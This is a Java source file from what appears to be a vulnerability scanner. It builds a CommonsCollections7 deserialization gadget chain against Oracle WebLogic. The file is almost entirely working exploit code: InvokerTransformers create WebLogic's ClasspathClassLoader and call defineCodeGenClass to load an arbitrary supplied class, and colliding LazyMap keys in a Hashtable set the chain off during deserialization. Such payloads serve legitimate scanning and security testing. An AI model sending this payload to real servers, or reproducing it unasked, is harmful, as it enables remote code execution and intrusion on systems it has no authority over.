package com.gbw.scanner.plugins.scripts.weblogic.payload;

import com.gbw.scanner.utils.ClassFiles;
import com.gbw.scanner.utils.Reflections;
import com.gbw.scanner.utils.Serializer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import weblogic.utils.classloaders.ClasspathClassLoader;

import java.net.URL;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;


public class GBWCommonsCollections7 implements GBWEchoPayload<Hashtable> {

    public Hashtable getObject(String version,Class echoClass) throws Exception {

        byte[] buf = ClassFiles.classAsBytes(echoClass);
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(ClasspathClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor",
                        new Class[]{Class[].class},
                        new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance",
                        new Class[]{Object[].class},
                        new Object[]{new Object[0]}),
                new InvokerTransformer("defineCodeGenClass",
                        new Class[]{String.class, byte[].class, URL.class}, new Object[]{echoClass.getName(), buf, null}),
                new ConstantTransformer(1)};

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);


        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);


        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        return hashtable;
    }


    @Override
    public String getName() {
        return "GBWCommonsCollections7";
    }
}
